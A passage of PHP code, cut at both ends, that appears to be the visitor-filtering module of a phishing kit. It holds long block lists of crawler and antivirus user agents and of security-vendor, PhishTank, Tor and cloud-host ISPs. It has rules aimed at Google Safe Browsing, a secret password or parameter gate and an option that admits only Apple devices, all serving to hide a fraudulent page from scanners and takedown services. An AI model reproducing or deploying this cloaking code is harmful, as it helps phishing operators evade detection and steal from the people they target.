"DSurf15a 81",
"DSurf15a VA",
"EBrowse 1.4b",
"Educate Search VxB",
"EmailSiphon",
"EmailSpider",
"EmailWolf 1.00",
"ESurf15a 15",
"ExtractorPro",
"Franklin Locator 1.8",
"FSurf15a 01",
"Full Web Bot 0416B",
"Full Web Bot 0516B",
"Full Web Bot 2816B "

 

 
);
if($setting['block_useragent'] == "1"){
    foreach($blocked_words as $word2) {
        if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {
            $ip = getenv("REMOTE_ADDR");
            $file = fopen("block_bot.txt","a");
            fwrite($file," BLOCKED BY USER AGENT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
             $click = fopen("result/total_bot.txt","a");
            fwrite($click,"$ip (Detect by USERAGENT)"."\n");
            fclose($click);
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
        }  
    }
}

$Bot = array(
    "abot",
    "dbot",
    "ebot",
    "hbot",
    "kbot",
    "lbot",
    "mbot",
    "nbot",
    "obot",
    "pbot",
    "rbot",
    "sbot",
    "tbot",
    "vbot",
    "ybot",
    "zbot",
    "bot.",
    "bot/",
    "_bot",
    ".bot",
    "/bot",
    "-bot",
    ":bot",
    "(bot",
    "crawl",
    "slurp",
    "spider",
    "seek",
    "avg",
    "avira",
    "bitdefender",
    "kaspersky",
    "sophos",
    "virustotal",
    "virus",
    "accoona",
    "acoon",
    "adressendeutschland",
    "ah-ha.com",
    "ahoy",
    "altavista",
    "ananzi",
    "anthill",
    "appie",
    "arachnophilia",
    "arale",
    "araneo",
    "aranha",
    "architext",
    "aretha",
    "arks",
    "asterias",
    "atlocal",
    "atn",
    "atomz",
    "augurfind",
    "backrub",
    "bannana_bot",
    "baypup",
    "bdfetch",
    "big brother",
    "biglotron",
    "bjaaland",
    "blackwidow",
    "blaiz",
    "blog",
    "blo.",
    "bloodhound",
    "boitho",
    "booch",
    "bradley",
    "butterfly",
    "calif",
    "cassandra",
    "ccubee",
    "cfetch",
    "charlotte",
    "churl",
    "cienciaficcion",
    "cmc",
    "collective",
    "comagent",
    "combine",
    "computingsite",
    "csci",
    "curl",
    "cusco",
    "daumoa",
    "deepindex",
    "delorie",
    "depspid",
    "deweb",
    "die blinde kuh",
    "digger",
    "ditto",
    "dmoz",
    "docomo",
    "download express",
    "dtaagent",
    "dwcp",
    "ebiness",
    "ebingbong",
    "e-collector",
    "ejupiter",
    "emacs-w3 search engine",
    "esther",
    "evliya celebi",
    "ezresult",
    "falcon",
    "felix ide",
    "ferret",
    "fetchrover",
    "fido",
    "findlinks",
    "fireball",
    "fish search",
    "fouineur",
    "funnelweb",
    "gazz",
    "gcreep",
    "genieknows",
    "getterroboplus",
    "geturl",
    "glx",
    "goforit",
    "golem",
    "grabber",
    "grapnel",
    "gralon",
    "griffon",
    "gromit",
    "grub",
    "gulliver",
    "hamahakki",
    "harvest",
    "havindex",
    "helix",
    "heritrix",
    "hku www octopus",
    "homerweb",
    "htdig",
    "html index",
    "html_analyzer",
    "htmlgobble",
    "hubater",
    "hyper-decontextualizer",
    "ia_archiver",
    "ibm_planetwide",
    "ichiro",
    "iconsurf",
    "iltrovatore",
    "image.kapsi.net",
    "imagelock",
    "incywincy",
    "indexer",
    "infobee",
    "informant",
    "ingrid",
    "inktomisearch.com",
    "inspector web",
    "intelliagent",
    "internet shinchakubin",
    "ip3000",
    "iron33",
    "israeli-search",
    "ivia",
    "jack",
    "jakarta",
    "javabee",
    "jetbot",
    "jumpstation",
    "katipo",
    "kdd-explorer",
    "kilroy",
    "knowledge",
    "kototoi",
    "kretrieve",
    "labelgrabber",
    "lachesis",
    "larbin",
    "legs",
    "libwww",
    "linkalarm",
    "link validator",
    "linkscan",
    "lockon",
    "lwp",
    "lycos",
    "magpie",
    "mantraagent",
    "mapoftheinternet",
    "marvin/",
    "mattie",
    "mediafox",
    "mediapartners",
    "mercator",
    "merzscope",
    "microsoft url control",
    "minirank",
    "miva",
    "mj12",
    "mnogosearch",
    "moget",
    "monster",
    "moose",
    "motor",
    "multitext",
    "muncher",
    "muscatferret",
    "mwd.search",
    "myweb",
    "najdi",
    "nameprotect",
    "nationaldirectory",
    "nazilla",
    "ncsa beta",
    "nec-meshexplorer",
    "nederland.zoek",
    "netcarta webmap engine",
    "netmechanic",
    "netresearchserver",
    "netscoop",
    "newscan-online",
    "nhse",
    "nokia6682/",
    "nomad",
    "noyona",
    "siteexplorer",
    "nutch",
    "nzexplorer",
    "objectssearch",
    "occam",
    "omni",
    "open text",
    "openfind",
    "openintelligencedata",
    "orb search",
    "osis-project",
    "pack rat",
    "pageboy",
    "pagebull",
    "page_verifier",
    "panscient",
    "parasite",
    "partnersite",
    "patric",
    "pear.",
    "pegasus",
    "peregrinator",
    "pgp key agent",
    "phantom",
    "phpdig",
    "picosearch",
    "piltdownman",
    "pimptrain",
    "pinpoint",
    "pioneer",
    "piranha",
    "plumtreewebaccessor",
    "pogodak",
    "poirot",
    "pompos",
    "poppelsdorf",
    "poppi",
    "popular iconoclast",
    "psycheclone",
    "publisher",
    "python",
    "rambler",
    "raven search",
    "roach",
    "road runner",
    "roadhouse",
    "robbie",
    "robofox",
    "robozilla",
    "rules",
    "salty",
    "sbider",
    "scooter",
    "scoutjet",
    "scrubby",
    "search.",
    "searchprocess",
    "semanticdiscovery",
    "senrigan",
    "sg-scout",
    "shai'hulud",
    "shark",
    "shopwiki",
    "sidewinder",
    "sift",
    "silk",
    "simmany",
    "site searcher",
    "site valet",
    "sitetech-rover",
    "skymob.com",
    "sleek",
    "smartwit",
    "sna-",
    "snappy",
    "snooper",
    "sohu",
    "speedfind",
    "sphere",
    "sphider",
    "spinner",
    "spyder",
    "steeler/",
    "suke",
    "suntek",
    "supersnooper",
    "surfnomore",
    "sven",
    "sygol",
    "szukacz",
    "tach black widow",
    "tarantula",
    "templeton",
    "/teoma",
    "t-h-u-n-d-e-r-s-t-o-n-e",
    "theophrastus",
    "titan",
    "titin",
    "tkwww",
    "toutatis",
    "t-rex",
    "tutorgig",
    "twiceler",
    "twisted",
    "ucsd",
    "udmsearch",
    "url check",
    "updated",
    "vagabondo",
    "valkyrie",
    "verticrawl",
    "victoria",
    "vision-search",
    "volcano",
    "voyager/",
    "voyager-hc",
    "w3c_validator",
    "w3m2",
    "w3mir",
    "walker",
    "wallpaper",
    "wanderer",
    "wauuu",
    "wavefire",
    "web core",
    "web hopper",
    "web wombat",
    "webbandit",
    "webcatcher",
    "webcopy",
    "webfoot",
    "weblayers",
    "weblinker",
    "weblog monitor",
    "webmirror",
    "webmonkey",
    "webquest",
    "webreaper",
    "websitepulse",
    "websnarf",
    "webstolperer",
    "webvac",
    "webwalk",
    "webwatch",
    "webwombat",
    "webzinger",
    "wget",
    "whizbang",
    "whowhere",
    "wild ferret",
    "worldlight",
    "wwwc",
    "wwwster",
    "xenu",
    "xget",
    "xift",
    "xirq",
    "yandex",
    "yanga",
    "yeti",
    "yodao",
    "zao/",
    "zippp",
    "zyborg",
    "proximic",
    "Googlebot",
    "Baiduspider",
    "Cliqzbot",
    "A6-Indexer",
    "AhrefsBot",
    "Genieo",
    "BomboraBot",
    "CCBot",
    "URLAppendBot",
    "DomainAppender",
    "msnbot-media",
    "Antivirus",
    "YoudaoBot",
    "MJ12bot",
    "linkdexbot",
    "Go-http-client",
    "presto",
    "BingPreview",
    "go-http-client",
     "go-http-client/1.1",
     "trident",
     "presto",
     "virustotal",
     "unchaos",
     "dreampassport",
     "sygol",
     "nutch",
     "privoxy",
     "zipcommander",
     "neofonie",
     "abacho",
     "acoi",
     "acoon",
     "adaxas",
     "agada",
     "aladin",
     "alkaline",
     "amibot",
     "anonymizer",
     "aplix",
     "aspseek",
     "avant",
     "baboom",
     "anzwers",
     "anzwerscrawl",
     "crawlconvera",
     "del.icio.us",
     "camehttps",
     "annotate",
     "wapproxy",
     "translate",
     "feedfetcher",
     "ask24",
     "asked",
     "askaboutoil",
     "fangcrawl",
     "amzn_assoc",
     "bingpreview",
     "dr.web",
     "drweb",
     "bilbo",
     "blackwidow",
     "sogou",
     "sogou-test-spider",
     "exabot",
     "externalhit",
     "ia_archiver",
     "mj12",
     "okhttp",
     "simplepie",
     "curl",
     "wget",
     "virus",
     "pipes",
     "antivirus",
     "python",
	 "telegram.com",
     "ruby",
     "avast",
     "firebird",
     "scmguard",
     "adsbot",
     "weblight",
     "favicon",
     "analytics",
     "insights",
     "headless",
     "github",
     "node",
     "agusescan",
     "zteopen"
);
if($setting['block_useragent'] == "1"){
    foreach ($Bot as $BotType) {
        if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
            $ip = getenv("REMOTE_ADDR");
            $file = fopen("block_bot.txt","a");
            fwrite($file," BLOCKED BY USER AGENT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
             $click = fopen("result/total_bot.txt","a");
            fwrite($click,"$ip (Detect by USERAGENT)"."\n");
            fclose($click);
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
        }
    }
}

if($setting['block_iprange'] == "1") {
    include 'block3.php';
}
include 'main.php';
if($setting['proxy_block'] == 1) {
    include 'proxyblock.php';
}

function getOSsss() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/cros/i'            =>  'Chrome OS',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

$os        =   getOSsss();

function getBrowsersss() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

$br        =   getBrowsersss();

function getisp($ip) {
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}

$ispnya = getisp($ip2);

$banned_isp = array(
    'Peak 10',
    'Quasi Networks LTD',
    'GoDaddy.com, LLC',
    'Server Plan S.r.l.',
    'Linode',
    'PIPEX-BLOCK1',
    'IPVanish',
    'Cisco Systems',
    'Tehnologii Budushego LLC',
    'Eonix Corporation',
    'hosttech GmbH',
    'Wowrack.com',
    'SunGard Availability Services LP',
    'Internap Network Services Corporation',
    'Palo Alto Networks',
    'PlusNet Technologies Ltd',
    'Scaleway',
    'Facebook',
    'Host1Plus',
    'XO Communications',
    'Nobis Technology Group',
    'ExpressVPN',
    'DME Hosting LLC',
    'Prescient Software',
    'Sungard Network Solutions',
    'OVH SAS',
    'Iomart Hosting Ltd',
    'Hosting Solution',
    'Barracuda Networks',
    'Sungard Network Solutions',
    'Solar VPS',
    'PHPNET Hosting Services',
    'DigitalOcean',
    'Level 3 Communications',
    'softlayer',
    'SoftLayer Technologies',
    'Complete Internet Access',
    'london-tor.mooo.com',
    'amazonaws',
    'cyveillance',
    'phishtank',
    'tor.piratenpartei-nrw.de',
    'cpanel66.proisp.no',
    'tor-node.com',
    'dreamhost',
    'Involta',
    'exit0.liskov.tor-relays.net',
    'tor.tocici.com',
    'netpilot',
    'calyxinstitute',
    'tor-exit',
    'msnbot',
    'p3pwgdsn',
    'netcraft',
    'University of Virginia',
    'trendmicro',
    'ebay',
    'paypal',
    'torservers',
    'comodo',
    'EGIHosting',
    'ebbs.healingpathsolutions.com',
    'healingpathsolutions.com',
    'Solution Pro',
    'Zayo Bandwidth',
    'spider.clicktargetdevelopment.com',
    'clicktargetdevelopment.com',
    'static.spro.net',
    'Digital Ocean',
    'Internap Network Services Corporation',
    'Blue Coat Systems',
    'GANDI SAS',
    'roamsite.com',
    'PIPEX-BLOCK1',
    'ColoUp',
    'Westnet',
    'The University of Tokyo',
    'University',
    'University of',
    'QuadraNet',
    'exit-01a.noisetor.net',
    'noisetor.net',
    'noisetor',
    'vultr.com',
    'Zscaler',
    'Choopa',
    'RedSwitches Pty',
    'Quintex Alliance Consulting',
    'www16.mailshell.com',
    'this.is.a.tor.exit-node.net',
    'this.is.a.tor.node.xmission.com',
    'colocrossing.com',
    'DedFiberCo',
    'crawl',
    'sucuri.net',
    'crawler',
    'proxy',
    'enom',
    'cloudflare',
    'yahoo',
    'trustwave',
    'rima-tde.net',
    'tfbnw.net',
    'pacbell.net',
    'tpnet.pl',
    'ovh.net',
    'centralnic',
    'badware',
    'phishing',
    'antivirus',
    'SiteAdvisor',
    'McAfee',
    'Bitdefender',
    'avirasoft',
    'phishtank.com',
    'googleusercontent',
    'OVH SAS',
    'Yahoo',
    'Yahoo! Inc.',
    'Google',
    'Google Inc.',
    'GoDaddy',
    'Amazon Technologies Inc.',
    'Amazon',
    'Top Level Hosting SRL',
    'Twitter',
    'Microsoft',
    'Microsoft Corporation',
    'OVH',
    'VPSmalaysia.com.my',
    'Madgenius.com',
    'Barracuda Networks Inc.',
    'Barracuda',
    'SecuredConnectivity.net',
    'Digital Domain',
    'Hetzner Online',
    'Akamai',
    'SoftLayer',
    'SURFnet',
    'Creative Thought Inc.',
    'Fastly',
    'Return Path Inc.',
    'WhatsApp',
    'Instagram',
    'Schulte Consulting LLC',
    'Universidade Federal do Rio de Janeiro',
    'Sectoor',
    'Bitfolk',
    'DIR A/S',
    'Team Technologies LLC',
    'Mainloop',
    'Junk Email Filter Inc.',
    'Art Matrix - Lightlink Inc.',
    'Redpill Linpro AS',
    'CloudFlare',
    'ESET spol. s r.o.',
    'AVAST Software s.r.o.',
    'Dosarrest',
    'Apple Inc.',
    'Symantec',
    'Mozilla',
    'Netprotect SRL',
    'Host Europe GmbH',
    'Host Sailor Ltd.',
    'PSINet Inc.',
    'Daniel James Austin',
    'RamNode',
    'Hostalia',
    'Xs4all Internet BV',
    'Inktomi Corporation',
    'Eircom Customer Assignment',
    '9New Network Inc',
    'Sony',
    'Private IP Address LAN',
    'Computer Problem Solving',
    'Fortinet',
    'Avira',
    'Rackspace',
    'Baidu',
    'Comodo',
    'Incapsula Inc',
    'Orange Polska Spolka Akcyjna',
    'Infosphere',
    'Private Customer',
    'SurfControl',
    'University of Newcastle upon Tyne',
    'Total Server Solutions',
    'LukMAN',
    'eSecureData',
    'Hosting',
    'VI Na Host Co. Ltd',
    'B2 Net Solutions',
    'Master Internet',
    'Global Perfomance',
    'Fireeye',
    'AntiVirus',
    'Security',
    'Intersoft Internet',
    'Voxility',
    'Linode',
    'Internet-Pro',
    'Trustwave Holdings Inc',
    'Online SAS',
    'Versaweb',
    'Liquid Web',
    'A100 ROW',
    'Apexis AG',
    'Apexis',
    'LogicWeb',
    'Virtual1 Limited',
    'VNET a.s.',
    'Static IP Assignment',
    'TerraTransit AG',
    'Merit Network',
    'PathsConnect',
    'Long Thrive',
    'LG DACOM',
    'Secure Internet',
    'Kaspersky',
    'UK Dedicated Servers Limited',
    'Customer Network',
    'Flokinet',
    'Simpli Networks LLC',
    'Psychz',
    'PrivateSystems Networks',
    'ScanSafe Services',
    'CachedNet',
    'CloudVPN',
    'Spark New Zealand Trading Ltd',
    'Whitelabel IT Solutions Corp',
    'Hostwinds',
    'Hosteros LLC',
    'HostUS',
    'Host',
    'ClientID',
    'Server',
    'Oracle',
    'Fortinet',
    'Unus Inc.',
    'Public facing services'
);
if($setting['block_isp'] == "1"){
    foreach ($banned_isp as $isps) {
        if (substr_count($ispnya, $isps) > 0) {
            $file = fopen("block_bot.txt","a");
            fwrite($file," BLOCKED ISP || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
             $click = fopen("result/total_bot.txt","a");
            fwrite($click,"$ip (Detect by ISP)"."\n");
            fclose($click);
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
        }
    }
}

if($ip2 == "92.23.57.168" or $ip2 == "96.31.1.4") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
         $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows Server 2003/XP x64" and $br == "Firefox") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
         $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows XP" and $br == "Firefox") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows XP" and $br == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}

if($os == "Windows XP" and $br == "Chrome") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows Vista" and $br == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Chrome OS") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "BlackBerry") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Linux") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($br == "Unknown Browser") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($br == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows 2000") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Unknown OS Platform") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($setting['site_password'] == 1) {
    $secret = md5($ip2);
    $password = $_POST[$secret];
    $mypass = md5($setting['password']);
    if(!isset($password)) {
        $click = fopen("result/log_visitor.txt","a");
        $jam = date("h:i:sa");
        fwrite($click,"[$ip2] Bot Detected Site Pass"."\n");
        fclose($click);
        $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED BOT INDEX || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Bot Server)"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    /*}else if($password != $mypass) {
        $click = fopen("result/log_visitor.txt","a");
        $jam = date("h:i:sa");
        fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Ada bot (Gagal Masuk Site Password)"."\n");
        fclose($click);
        header("location: $link");exit();*/
    }else{
        $_SESSION['site_password'] = $setting['password'];
    }
}

if($setting['site_parameter'] == 1) {
    $secret = $setting['parameter'];
    $password = $_GET[$secret];
    if(!isset($password)) {
        $click = fopen("result/log_visitor.txt","a");
        $jam = date("h:i:sa");
        fwrite($click,"[$ip2] Bot Detected Site Parameter)"."\n");
        fclose($click);
        $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED BOT INDEX || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Bot Server)"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        //header("location: $link",  true,  301 );  exit;
    }else{
        $_SESSION['site_parameter'] = $setting['parameter'];
    }
}

if($setting['lock_platform'] == 1) {
    if($os == "iPhone" or $os == "iPad" or $os == "iPod" or $os == "Mac OS X" or $os == "Mac OS 9") {
    }else{
        $click = fopen("result/log_visitor.txt","a");
        fwrite($click,"[$ip2] Bot Detected Lock Platform"."\n");
        fclose($click);
        $file = fopen("block_bot.txt","a");
